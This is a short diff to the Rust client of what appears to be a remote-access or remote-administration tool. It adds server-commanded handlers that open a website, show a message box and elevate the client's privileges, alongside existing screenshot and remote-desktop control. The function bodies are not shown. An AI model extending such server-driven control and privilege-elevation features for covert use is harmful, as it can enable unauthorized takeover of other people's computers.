@@ -1,4 +1,4 @@
-use crate::features::other::{take_screenshot, client_info};
+use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
 use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click};
 use common::async_impl::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -58,6 +58,18 @@ pub async fn reading_loop(
                 println!("Server requested reconnection. Reconnecting...");
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
+            }
+
+            Ok(Some(ClientboundPacket::VisitWebsite(visit_data))) => {
+                visit_website(&visit_data);
+            }
+
+            Ok(Some(ClientboundPacket::ShowMessageBox(message_box_data))) => {
+                show_messagebox(message_box_data);
+            }
+
+            Ok(Some(ClientboundPacket::ElevateClient)) => {
+                elevate_client();
             }
 
             Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => {
